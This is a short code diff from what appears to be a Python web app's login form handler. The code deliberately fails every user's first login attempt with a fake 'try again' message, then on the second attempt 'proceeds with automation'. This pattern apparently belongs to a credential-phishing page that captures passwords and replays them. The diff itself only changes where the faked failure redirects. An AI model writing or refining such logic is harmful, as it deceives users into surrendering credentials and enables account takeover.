@@ -439,8 +439,8 @@ def process_form():
             log_session_activity("first_attempt_blocked", user_email=email, success=False, 
                                error_message="First attempt automatically failed - moving to second pass")
             
-            # Redirect to second pass with try again message
-            return redirect(url_for('index', step='password', email=email, error='true', retry='true'))
+            # Redirect to second pass with try again message  
+            return redirect(url_for('index', step='retry', email=email, retry='true'))
         
         elif login_attempt.attempt_count == 1:
             # Second attempt - proceed with automation
